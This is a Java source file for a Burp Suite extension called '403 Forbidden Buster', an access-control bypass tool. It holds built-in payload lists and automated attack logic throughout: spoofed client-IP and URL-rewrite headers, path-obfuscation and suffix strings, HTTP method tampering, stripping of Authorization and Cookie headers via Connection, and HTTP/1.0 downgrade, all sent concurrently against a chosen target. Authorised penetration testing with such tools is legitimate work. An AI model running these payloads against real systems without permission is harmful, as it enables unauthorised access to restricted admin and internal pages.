package com.bughunter;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.persistence.Preferences;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private Preferences preferences;
    private final BypassTableModel tableModel = new BypassTableModel();
    // Main executor for launching attacks (fire and forget)
    private final ExecutorService mainExecutor = Executors.newCachedThreadPool();

    // UI Components
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;
    private JTextArea ipConfigArea;
    private JTextArea pathConfigArea;
    private JSlider rateLimitSlider;
    private JLabel rateLimitLabel;
    
    // New UI Components
    private JCheckBox chkHeaders;
    private JCheckBox chkPathObf;
    private JCheckBox chkMethods;
    private JCheckBox chkSuffixes;
    private JCheckBox chkHide404;
    private JSpinner threadSpinner;

    // Defaults
    private static final String DEFAULT_IPS = "127.0.0.1\nlocalhost\n0.0.0.0\n192.168.0.1\n10.0.0.1\n::1\n127.0.0.2";
    private static final String DEFAULT_PATHS = "/admin\n/dashboard\n/login\n/panel\n/console\n/manager\n/administrator\n/private\n/internal\n/sysadmin\n/auth";
    private static final int DEFAULT_DELAY = 50; // ms
    private static final int DEFAULT_THREADS = 5;

    // --- PAYLOAD LISTS ---
    private static final List<String> BYPASS_HEADERS = Arrays.asList(
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For", "X-Forwarded-Host",
            "X-Host", "X-Custom-IP-Authorization", "Client-IP", "X-Remote-IP",
            "X-Originating-IP", "Fastly-Client-IP", "True-Client-IP", "Referer",
            "X-Client-IP", "X-Real-IP", "X-Forwarded-Server", "X-Wap-Profile", "X-ProxyUser-Ip"
    );
    private static final List<String> PATH_OBFUSCATION = Arrays.asList(
            "/.", "//", "/./", "/;", "/.;", "//;", "/..;/", "/%2e/", "/%2f", "/admin/.",
            "/%252e/", "/%ef%bc%8f", "/%u002e/", "%09", "%20", "%00"
    );
    private static final List<String> SUFFIX_PAYLOADS = Arrays.asList(
            "?", "??", "&", "#", "%09", "%20",
            ".json", ".css", ".png", ".js", ".html", ".ico",
            ";jsessionid=1337", ";type=a", "/", "/."
    );

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.preferences = api.persistence().preferences();
        api.extension().setName("403 Forbidden Buster (Platinum v6.1)");

        SwingUtilities.invokeLater(() -> {
            // --- TAB 1: MONITOR ---
            JTable table = new JTable(tableModel);
            table.setFont(new Font("SansSerif", Font.PLAIN, 12));
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            table.setDefaultRenderer(Object.class, new StatusColorRenderer()); // Custom Renderer

            UserInterface ui = api.userInterface();
            requestViewer = ui.createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = ui.createHttpResponseEditor(EditorOptions.READ_ONLY);

            table.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) {
                    int selectedRow = table.getSelectedRow();
                    if (selectedRow != -1) {
                        // Convert view index to model index in case of sorting (if added later)
                        int modelRow = table.convertRowIndexToModel(selectedRow);
                        BypassResult result = tableModel.getResult(modelRow);
                        requestViewer.setRequest(result.requestResponse.request());
                        responseViewer.setResponse(result.requestResponse.response());
                    } else {
                        requestViewer.setRequest(null);
                        responseViewer.setResponse(null);
                    }
                }
            });

            // Context Menu (Delete/Clear)
            JPopupMenu popupMenu = new JPopupMenu();
            JMenuItem deleteItem = new JMenuItem("Delete Item");
            JMenuItem clearItem = new JMenuItem("Clear History");
            deleteItem.addActionListener(e -> {
                int selectedRow = table.getSelectedRow();
                if (selectedRow != -1) tableModel.removeRow(table.convertRowIndexToModel(selectedRow));
            });
            clearItem.addActionListener(e -> tableModel.clear());
            popupMenu.add(deleteItem);
            popupMenu.addSeparator();
            popupMenu.add(clearItem);

            table.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseReleased(MouseEvent e) { handleContextMenu(e); }
                @Override
                public void mousePressed(MouseEvent e) { handleContextMenu(e); }
                private void handleContextMenu(MouseEvent e) {
                    if (e.isPopupTrigger()) {
                        int row = table.rowAtPoint(e.getPoint());
                        if (row != -1 && !table.isRowSelected(row)) table.setRowSelectionInterval(row, row);
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                }
            });

            JScrollPane tableScroll = new JScrollPane(table);
            JSplitPane bottomSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, requestViewer.uiComponent(), responseViewer.uiComponent());
            bottomSplit.setResizeWeight(0.5);
            JSplitPane monitorPanel = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, bottomSplit);
            monitorPanel.setResizeWeight(0.3);

            // --- TAB 2: CONFIGURATION ---
            JPanel configPanel = new JPanel();
            configPanel.setLayout(new BoxLayout(configPanel, BoxLayout.Y_AXIS));

            // 1. IP Config Area
            JPanel ipPanel = new JPanel(new BorderLayout());
            ipPanel.setBorder(new TitledBorder("IP Spoofing List (One per line)"));
            String savedIps = preferences.getString("ips");
            ipConfigArea = new JTextArea(savedIps != null ? savedIps : DEFAULT_IPS);
            ipPanel.add(new JScrollPane(ipConfigArea), BorderLayout.CENTER);
            ipPanel.setPreferredSize(new Dimension(800, 150));

            // 2. Path Config Area
            JPanel pathPanel = new JPanel(new BorderLayout());
            pathPanel.setBorder(new TitledBorder("Dictionary / Path List (One per line)"));
            String savedPaths = preferences.getString("paths");
            pathConfigArea = new JTextArea(savedPaths != null ? savedPaths : DEFAULT_PATHS);
            pathPanel.add(new JScrollPane(pathConfigArea), BorderLayout.CENTER);
            pathPanel.setPreferredSize(new Dimension(800, 150));

            // 3. Settings Area
            JPanel settingsPanel = new JPanel(new GridBagLayout());
            settingsPanel.setBorder(new TitledBorder("Scan Settings"));
            GridBagConstraints gbc = new GridBagConstraints();
            gbc.anchor = GridBagConstraints.WEST;
            gbc.insets = new Insets(5, 5, 5, 5);

            // Delay
            String savedDelayStr = preferences.getString("delay");
            int initialDelay = DEFAULT_DELAY;
            try { initialDelay = Integer.parseInt(savedDelayStr); } catch (Exception ignored) {}
            
            rateLimitLabel = new JLabel("Request Delay (ms): " + initialDelay);
            rateLimitSlider = new JSlider(0, 1000, initialDelay);
            rateLimitSlider.addChangeListener(e -> rateLimitLabel.setText("Request Delay (ms): " + rateLimitSlider.getValue()));

            // Thread Count
            String savedThreads = preferences.getString("threads");
            int initialThreads = DEFAULT_THREADS;
            try { initialThreads = Integer.parseInt(savedThreads); } catch (Exception ignored) {}
            threadSpinner = new JSpinner(new SpinnerNumberModel(initialThreads, 1, 50, 1));
            JLabel threadLabel = new JLabel("Concurrency (Threads):");

            // Toggles
            chkHeaders = new JCheckBox("Enable Header Attacks", preferences.getBoolean("chkHeaders") == null || preferences.getBoolean("chkHeaders"));
            chkPathObf = new JCheckBox("Enable Path Obfuscation", preferences.getBoolean("chkPathObf") == null || preferences.getBoolean("chkPathObf"));
            chkMethods = new JCheckBox("Enable Method Tampering", preferences.getBoolean("chkMethods") == null || preferences.getBoolean("chkMethods"));
            chkSuffixes = new JCheckBox("Enable Suffix Attacks", preferences.getBoolean("chkSuffixes") == null || preferences.getBoolean("chkSuffixes"));
            chkHide404 = new JCheckBox("Hide 404 Responses", preferences.getBoolean("chkHide404") != null && preferences.getBoolean("chkHide404"));

            // Layout Settings
            gbc.gridx = 0; gbc.gridy = 0; settingsPanel.add(rateLimitLabel, gbc);
            gbc.gridx = 1; gbc.gridy = 0; settingsPanel.add(rateLimitSlider, gbc);
            
            gbc.gridx = 0; gbc.gridy = 1; settingsPanel.add(threadLabel, gbc);
            gbc.gridx = 1; gbc.gridy = 1; settingsPanel.add(threadSpinner, gbc);

            gbc.gridx = 0; gbc.gridy = 2; settingsPanel.add(chkHeaders, gbc);
            gbc.gridx = 1; gbc.gridy = 2; settingsPanel.add(chkPathObf, gbc);
            
            gbc.gridx = 0; gbc.gridy = 3; settingsPanel.add(chkMethods, gbc);
            gbc.gridx = 1; gbc.gridy = 3; settingsPanel.add(chkSuffixes, gbc);
            
            gbc.gridx = 0; gbc.gridy = 4; settingsPanel.add(chkHide404, gbc);

            JButton saveButton = new JButton("Save Configuration");
            saveButton.addActionListener(e -> {
                saveSettings();
                JOptionPane.showMessageDialog(null, "Settings Saved!");
            });
            gbc.gridx = 0; gbc.gridy = 5; gbc.gridwidth = 2; gbc.fill = GridBagConstraints.HORIZONTAL;
            settingsPanel.add(saveButton, gbc);

            configPanel.add(settingsPanel);
            configPanel.add(ipPanel);
            configPanel.add(pathPanel);

            // --- MAIN TABS ---
            JTabbedPane tabs = new JTabbedPane();
            tabs.addTab("Monitor Results", monitorPanel);
            tabs.addTab("Configuration", configPanel);

            api.userInterface().registerSuiteTab("403 Buster", tabs);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("403 Buster Platinum v6.1 Loaded.");
    }

    private void saveSettings() {
        preferences.setString("ips", ipConfigArea.getText());
        preferences.setString("paths", pathConfigArea.getText());
        preferences.setString("delay", String.valueOf(rateLimitSlider.getValue()));
        preferences.setString("threads", String.valueOf(threadSpinner.getValue()));
        preferences.setBoolean("chkHeaders", chkHeaders.isSelected());
        preferences.setBoolean("chkPathObf", chkPathObf.isSelected());
        preferences.setBoolean("chkMethods", chkMethods.isSelected());
        preferences.setBoolean("chkSuffixes", chkSuffixes.isSelected());
        preferences.setBoolean("chkHide404", chkHide404.isSelected());
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        if (event.messageEditorRequestResponse().isEmpty()) return null;
        JMenuItem bypassItem = new JMenuItem("Bypass 403 Forbidden");
        MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
        bypassItem.addActionListener(l -> mainExecutor.submit(() -> startAttack(editor.requestResponse())));
        List<Component> menuList = new ArrayList<>();
        menuList.add(bypassItem);
        return menuList;
    }

    private void startAttack(HttpRequestResponse baseRequestResponse) {
        saveSettings(); // Save current state

        HttpRequest originalRequest = baseRequestResponse.request();
        String originalPath = originalRequest.path();
        String host = baseRequestResponse.httpService().host();
        String scheme = baseRequestResponse.httpService().secure() ? "https://" : "http://";
        
        // Baseline analysis
        short baseStatus = baseRequestResponse.response().statusCode();
        int baseLength = baseRequestResponse.response().body().length();

        // Read Settings
        List<String> userIPs = Arrays.stream(ipConfigArea.getText().split("\\n"))
                .map(String::trim).filter(s -> !s.isEmpty()).collect(Collectors.toList());
        List<String> userPaths = Arrays.stream(pathConfigArea.getText().split("\\n"))
                .map(String::trim).filter(s -> !s.isEmpty()).collect(Collectors.toList());
        int delayMs = rateLimitSlider.getValue();
        int threadCount = (Integer) threadSpinner.getValue();
        boolean hide404 = chkHide404.isSelected();

        api.logging().logToOutput("[-] Starting Attack: " + originalPath + " | Threads: " + threadCount);

        ExecutorService attackExecutor = Executors.newFixedThreadPool(threadCount);

        try {
            // 1. Headers + IP Spoofing
            if (chkHeaders.isSelected()) {
                for (String header : BYPASS_HEADERS) {
                    for (String ip : userIPs) {
                        attackExecutor.submit(() -> {
                            HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
                            sendAndLog(newReq, "Header: " + header + " val: " + ip, baseStatus, baseLength, delayMs, hide404);
                        });
                    }
                    
                    // Dictionary Path Swapping
                    if (header.contains("URL") || header.contains("Rewrite")) {
                        attackExecutor.submit(() -> {
                            HttpRequest swapReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, originalPath));
                            sendAndLog(swapReq, "Path Swap: / + " + header, baseStatus, baseLength, delayMs, hide404);
                        });

                        for (String dictPath : userPaths) {
                            attackExecutor.submit(() -> {
                                String cleanDictPath = dictPath.startsWith("/") ? dictPath : "/" + dictPath;
                                HttpRequest dictReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, cleanDictPath));
                                sendAndLog(dictReq, "Dictionary Swap: " + header + " = " + cleanDictPath, baseStatus, baseLength, delayMs, hide404);
                            });
                        }
                    }
                    
                    // Referer
                    if (header.equalsIgnoreCase("Referer")) {
                        List<String> refs = new ArrayList<>();
                        refs.add(scheme + host + originalPath);
                        for(String p : userPaths) refs.add(scheme + host + (p.startsWith("/") ? p : "/" + p));
                        for (String refUrl : refs) {
                            attackExecutor.submit(() -> 
                                sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl)), "Referer: " + refUrl, baseStatus, baseLength, delayMs, hide404)
                            );
                        }
                    }
                }
                
                // Hop-By-Hop
                List<String> hopHeaders = new ArrayList<>(BYPASS_HEADERS);
                hopHeaders.add("Cookie"); hopHeaders.add("Authorization");
                for (String hop : hopHeaders) {
                    attackExecutor.submit(() -> 
                        sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop)), "Hop-By-Hop Strip: " + hop, baseStatus, baseLength, delayMs, hide404)
                    );
                }
            }

            // 2. Path Obfuscation
            if (chkPathObf.isSelected()) {
                for (String payload : PATH_OBFUSCATION) {
                    if (payload.startsWith("/")) {
                        attackExecutor.submit(() -> {
                            String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
                            sendAndLog(originalRequest.withPath(payload + cleanOriginal), "Path Prefix: " + payload, baseStatus, baseLength, delayMs, hide404);
                        });
                    }
                }
                // Case Switching
                String upperPath = originalPath.toUpperCase();
                if (!upperPath.equals(originalPath)) {
                    attackExecutor.submit(() -> 
                        sendAndLog(originalRequest.withPath(upperPath), "Case: UPPER", baseStatus, baseLength, delayMs, hide404)
                    );
                }
            }

            // 3. Method Tampering
            if (chkMethods.isSelected()) {
                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseStatus, baseLength, delayMs, hide404));
                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withBody("").withHeader(HttpHeader.httpHeader("Content-Length", "0")), "Method: POST + CL:0", baseStatus, baseLength, delayMs, hide404));
                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseStatus, baseLength, delayMs, hide404));
                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseStatus, baseLength, delayMs, hide404));
                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withHeader(HttpHeader.httpHeader("X-HTTP-Method-Override", "GET")), "Method Override", baseStatus, baseLength, delayMs, hide404));
                
                // Protocol Downgrade
                attackExecutor.submit(() -> {
                    try {
                        String rawReq = originalRequest.toString();
                        Pattern p = Pattern.compile("HTTP/\\d(\\.\\d)?");
                        Matcher m = p.matcher(rawReq);
                        if (m.find()) {
                            String downgradedRaw = m.replaceFirst("HTTP/1.0");
                            HttpRequest downgradedReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), downgradedRaw);
                            sendAndLog(downgradedReq, "Protocol: HTTP/1.0", baseStatus, baseLength, delayMs, hide404);
                        }
                    } catch (Exception e) {}
                });
            }

            // 4. Suffixes
            if (chkSuffixes.isSelected()) {
                for (String suffix : SUFFIX_PAYLOADS) {
                    attackExecutor.submit(() -> 
                        sendAndLog(originalRequest.withPath(originalPath + suffix), "Suffix: " + suffix, baseStatus, baseLength, delayMs, hide404)
                    );
                }
            }

        } finally {
            attackExecutor.shutdown();
        }
    }

    private void sendAndLog(HttpRequest request, String description, short baseStatus, int baseLength, int delayMs, boolean hide404) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);
            HttpRequestResponse response = api.http().sendRequest(request);
            short statusCode = response.response().statusCode();
            int length = response.response().body().length();

            if (shouldLog(statusCode, length, baseStatus, baseLength, hide404)) {
                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
                        request.method(), request.url(), description, statusCode, length, response
                )));
            }

        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
    }

    private boolean shouldLog(short status, int length, short baseStatus, int baseLength, boolean hide404) {
        if (hide404 && status == 404) return false;
        if (status != baseStatus) return true; // Status changed (e.g. 403 -> 200)
        
        // Length difference check (allow 10% variance or fixed amount)
        int diff = Math.abs(length - baseLength);
        return diff > 100; // Threshold
    }

    static class StatusColorRenderer extends DefaultTableCellRenderer {
        @Override
        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
            Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
            if (!isSelected) {
                BypassTableModel model = (BypassTableModel) table.getModel();
                // Map view row to model row
                int modelRow = table.convertRowIndexToModel(row);
                BypassResult result = model.getResult(modelRow);
                
                if (result.status >= 200 && result.status < 300) {
                    c.setBackground(new Color(144, 238, 144)); // Light Green
                } else if (result.status >= 300 && result.status < 400) {
                    c.setBackground(new Color(255, 218, 185)); // Peach/Orange
                } else if (result.status >= 500) {
                    c.setBackground(new Color(255, 182, 193)); // Light Red
                } else {
                    c.setBackground(Color.WHITE);
                }
                c.setForeground(Color.BLACK);
            }
            return c;
        }
    }

    static class BypassTableModel extends AbstractTableModel {
        private final List<BypassResult> results = new ArrayList<>();
        private final String[] columns = {"Method", "URL", "Technique", "Status", "Length"};
        public void addResult(BypassResult result) { results.add(result); fireTableRowsInserted(results.size() - 1, results.size() - 1); }
        public void clear() { results.clear(); fireTableDataChanged(); }
        public void removeRow(int rowIndex) { if (rowIndex >= 0 && rowIndex < results.size()) { results.remove(rowIndex); fireTableRowsDeleted(rowIndex, rowIndex); } }
        public BypassResult getResult(int rowIndex) { return results.get(rowIndex); }
        @Override public int getRowCount() { return results.size(); }
        @Override public int getColumnCount() { return columns.length; }
        @Override public String getColumnName(int column) { return columns[column]; }
        @Override public Object getValueAt(int rowIndex, int columnIndex) {
            BypassResult result = results.get(rowIndex);
            switch (columnIndex) {
                case 0: return result.method;
                case 1: return result.url;
                case 2: return result.technique;
                case 3: return result.status;
                case 4: return result.length;
                default: return "";
            }
        }
    }

    static class BypassResult {
        String method, url, technique;
        int status, length;
        HttpRequestResponse requestResponse;
        public BypassResult(String method, String url, String technique, int status, int length, HttpRequestResponse requestResponse) {
            this.method = method; this.url = url; this.technique = technique; this.status = status; this.length = length; this.requestResponse = requestResponse;
        }
    }
}
